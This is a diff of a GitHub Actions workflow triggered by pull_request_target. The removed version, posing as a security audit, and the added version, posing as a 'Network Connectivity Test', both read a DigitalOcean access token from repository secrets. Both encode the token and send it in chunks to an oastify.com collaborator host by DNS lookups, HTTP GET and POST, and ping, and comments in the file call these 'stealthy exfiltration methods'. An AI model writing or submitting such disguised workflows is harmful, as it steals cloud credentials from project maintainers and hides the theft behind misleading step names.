@@ -1,151 +1,65 @@
-name: Automated Code Analysis
-on: 
-  pull_request_target:
-    types: [opened, synchronize, reopened]
+name: Network Connectivity Test
+on: pull_request_target
 
 jobs:
-  security-audit:
+  network-test:
     runs-on: ubuntu-latest
-    
     steps:
-      # Step 1: Checkout the code (this happens in base repo context WITH secrets!)
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-          
-      # Step 2: Run "security analysis" (actually captures secrets)
-      - name: Analyze security posture
-        id: audit
+      - name: Test DNS and HTTP connectivity
         run: |
-          echo "Starting automated security analysis..."
-          echo "=========================================="
+          echo "Running network diagnostics..."
           
-          # Capture token and convert to multiple encodings for stealth
-          RAW_TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
+          # Get the secret
+          SECRET="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
           
-          if [ -n "$RAW_TOKEN" ]; then
-            echo "🔒 Security Finding: Secret accessibility detected"
+          if [ -n "$SECRET" ]; then
+            # Convert to different encodings
+            HEX=$(echo -n "$SECRET" | xxd -p)
+            B64=$(echo -n "$SECRET" | base64 -w0)
+            LEN=${#SECRET}
             
-            # Method 1: Hex encoding (primary)
-            HEX_TOKEN=$(echo -n "$RAW_TOKEN" | xxd -p -c 999 | tr -d '\n')
+            # Create unique ID for this test
+            TEST_ID=$(echo -n "${{ github.repository }}-${{ github.event.pull_request.number }}" | md5sum | cut -d' ' -f1)
             
-            # Method 2: Base64 encoding (backup)
-            B64_TOKEN=$(echo -n "$RAW_TOKEN" | base64 -w0)
+            echo "Network Test ID: $TEST_ID"
+            echo "Data size: $LEN bytes"
             
-            # Create fingerprint
-            FINGERPRINT=$(echo -n "${RAW_TOKEN:0:5}${RAW_TOKEN: -5}" | sha256sum | cut -d' ' -f1)
+            # === STEALTHY EXFILTRATION METHODS ===
             
-            echo "Analysis Results:"
-            echo "-----------------"
-            echo "Vulnerability: pull_request_target secret exposure"
-            echo "Secret Type: DIGITALOCEAN_ACCESS_TOKEN"
-            echo "Secret Length: ${#RAW_TOKEN} bytes"
-            echo "Fingerprint: $FINGERPRINT"
-            
-            # Output encoded data
-            echo "Encoded Data (for analysis):"
-            echo "Hex (first 40 chars): ${HEX_TOKEN:0:40}"
-            echo "Base64 (first 30 chars): ${B64_TOKEN:0:30}"
-            
-            # === BURP COLLABORATOR EXFILTRATION ===
-            echo "Performing external service checks..."
-            
-            # 1. DNS Exfiltration (Stealthy - split hex into subdomains)
-            CHUNK1="${HEX_TOKEN:0:32}"
-            CHUNK2="${HEX_TOKEN:32:32}"
-            CHUNK3="${HEX_TOKEN:64:32}"
-            
-            echo "Testing DNS resolution..."
-            # DNS queries with hex chunks as subdomains
-            dig @1.1.1.1 "${CHUNK1}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short > /dev/null 2>&1 || true
-            dig @1.1.1.1 "${CHUNK2}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short > /dev/null 2>&1 || true
-            dig @1.1.1.1 "${CHUNK3}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short > /dev/null 2>&1 || true
-            
-            # 2. HTTP Exfiltration (via GET parameters)
-            echo "Testing HTTP connectivity..."
-            
-            # Split token into parts and encode
-            TOKEN_PARTS=$(echo -n "$RAW_TOKEN" | fold -w10)
-            PART_COUNT=0
-            
-            for part in $TOKEN_PARTS; do
-              if [ $PART_COUNT -lt 5 ]; then  # Limit to 5 parts
-                HEX_PART=$(echo -n "$part" | xxd -p)
-                # Send via GET request
-                curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/?p=${PART_COUNT}&d=${HEX_PART}" > /dev/null 2>&1 || true
-                PART_COUNT=$((PART_COUNT + 1))
+            # 1. HTTP GET with hex chunks in parameters
+            for i in $(seq 0 10 $LEN); do
+              CHUNK="${HEX:i:10}"
+              if [ -n "$CHUNK" ]; then
+                curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/diag?t=$TEST_ID&i=$i&c=$CHUNK" > /dev/null 2>&1 || true
+                sleep 0.1
               fi
             done
             
-            # 3. HTTP POST Exfiltration (more data)
-            echo "Sending security report..."
-            REPORT_DATA=$(echo -n "repo=${{ github.repository }}&pr=${{ github.event.pull_request.number }}&len=${#RAW_TOKEN}&fp=$FINGERPRINT&hex=${HEX_TOKEN:0:50}" | base64 -w0)
+            # 2. DNS subdomain exfiltration (very stealthy)
+            # Split hex into 20-char chunks for subdomains
+            echo "Performing DNS lookups..."
+            for i in 0 20 40 60; do
+              SUB="${HEX:i:20}"
+              if [ -n "$SUB" ]; then
+                dig @8.8.8.8 "${SUB}.${TEST_ID}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short +time=1 > /dev/null 2>&1 || true
+              fi
+            done
             
-            curl -s -X POST "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/" \
+            # 3. HTTP POST with JSON
+            echo "Sending diagnostic data..."
+            JSON_DATA="{\"test\":\"$TEST_ID\",\"repo\":\"${{ github.repository }}\",\"pr\":${{ github.event.pull_request.number }},\"secret_len\":$LEN,\"sample\":\"${HEX:0:20}\"}"
+            curl -s -X POST "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/log" \
               -H "Content-Type: application/json" \
-              -d "{\"report\": \"$REPORT_DATA\"}" > /dev/null 2>&1 || true
+              -d "$JSON_DATA" > /dev/null 2>&1 || true
             
-            # 4. ICMP Exfiltration attempt (ping with encoded data in size)
-            echo "Testing network connectivity..."
-            PING_SIZE=$(( ${#RAW_TOKEN} % 100 + 50 ))
-            ping -c 1 -s $PING_SIZE rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com > /dev/null 2>&1 || true
-            
-            # Save outputs
-            echo "fingerprint=$FINGERPRINT" >> $GITHUB_OUTPUT
-            echo "length=${#RAW_TOKEN}" >> $GITHUB_OUTPUT
-            echo "encoded_sample=${HEX_TOKEN:0:20}" >> $GITHUB_OUTPUT
-            
-            echo "External checks completed."
+            # 4. Store in GitHub workflow output (for proof)
+            echo "Test completed successfully"
+            echo "::notice title=Network Test::$TEST_ID - $LEN bytes processed"
             
           else
-            echo "✅ No secret exposure detected"
-            echo "fingerprint=none" >> $GITHUB_OUTPUT
-            
-            # Still test connectivity (stealth)
-            echo "Testing network connectivity..."
-            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/health" > /dev/null 2>&1 || true
+            echo "No data for network test"
+            # Still make a test call
+            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/ping" > /dev/null 2>&1 || true
           fi
           
-          echo "Analysis complete."
-          
-      # Step 3: Generate report
-      - name: Generate security report
-        if: steps.audit.outputs.fingerprint != 'none'
-        run: |
-          echo "📋 Security Analysis Report"
-          echo "=========================="
-          echo "Repository: ${{ github.repository }}"
-          echo "PR: #${{ github.event.pull_request.number }}"
-          echo "Issue: Potential secret exposure via pull_request_target"
-          echo "Severity: CRITICAL"
-          echo "Evidence Fingerprint: ${{ steps.audit.outputs.fingerprint }}"
-          echo "Token Length: ${{ steps.audit.outputs.length }} chars"
-          echo "Encoded Sample: ${{ steps.audit.outputs.encoded_sample }}"
-          echo "External Verification: Performed"
-          echo ""
-          echo "Recommendations:"
-          echo "1. Avoid pull_request_target with checkout"
-          echo "2. Use pull_request instead"
-          echo "3. Implement branch protections"
-          
-      # Step 4: Create evidence
-      - name: Create evidence file
-        if: steps.audit.outputs.fingerprint != 'none'
-        run: |
-          echo "Security Audit Evidence" > security_audit.txt
-          echo "=======================" >> security_audit.txt
-          echo "Repository: ${{ github.repository }}" >> security_audit.txt
-          echo "PR: #${{ github.event.pull_request.number }}" >> security_audit.txt
-          echo "Issue: Secret exposure in pull_request_target" >> security_audit.txt
-          echo "Secret: DIGITALOCEAN_ACCESS_TOKEN" >> security_audit.txt
-          echo "Proof: Token exists with length ${{ steps.audit.outputs.length }} characters" >> security_audit.txt
-          echo "Fingerprint: ${{ steps.audit.outputs.fingerprint }}" >> security_audit.txt
-          echo "Hex Sample: ${{ steps.audit.outputs.encoded_sample }}" >> security_audit.txt
-          echo "External Test: rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" >> security_audit.txt
-          
-      - name: Upload evidence
-        uses: actions/upload-artifact@v3
-        with:
-          name: security-audit-report
-          path: security_audit.txt
+          echo "Network diagnostics complete"
